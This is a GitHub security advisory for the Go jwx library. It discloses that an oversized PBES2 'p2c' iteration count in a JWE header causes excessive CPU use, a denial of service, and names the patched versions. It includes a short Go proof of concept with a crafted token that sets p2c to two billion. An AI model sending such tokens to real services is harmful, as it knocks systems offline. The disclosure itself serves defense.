# Malicious parameters in JWE can cause a DOS

Moderate

[lestrrat](/lestrrat)
published
GHSA-7f9x-gw85-8grf
Dec 3, 2023

## Package

gomod

github.com/lestrrat-go/jwx/v2/jwe
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

<=2.0.17, <=1.2.26

## Patched versions

v2.0.18, v1.2.27

## Description

### Summary

too high p2c parameter in JWE's alg PBES2-\* could lead to a DOS attack

### Details

The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.

Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack

### PoC

```
package main

import (
	"fmt"
	"github.com/lestrrat-go/jwx/v2/jwa"
	"github.com/lestrrat-go/jwx/v2/jwe"
	"github.com/lestrrat-go/jwx/v2/jwk"
)

func main() {
	token := []byte("eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2R0NNIiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJNNzczSnlmV2xlX2FsSXNrc0NOTU9BIn0=.S8B1kXdIR7BM6i_TaGsgqEOxU-1Sgdakp4mHq7UVhn-_REzOiGz2gg.gU_LfzhBXtQdwYjh.9QUIS-RWkLc.m9TudmzUoCzDhHsGGfzmCA")
	key, err := jwk.FromRaw([]byte(`abcdefg`))
	payload, err := jwe.Decrypt(token, jwe.WithKey(jwa.PBES2_HS256_A128KW, key))
	if err == nil {
		fmt.Println(string(payload))
	}
}
```
### Impact

It's a kind of Dos attack, the user's environment could potentially utilize an excessive amount of CPU resources.

### Severity

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
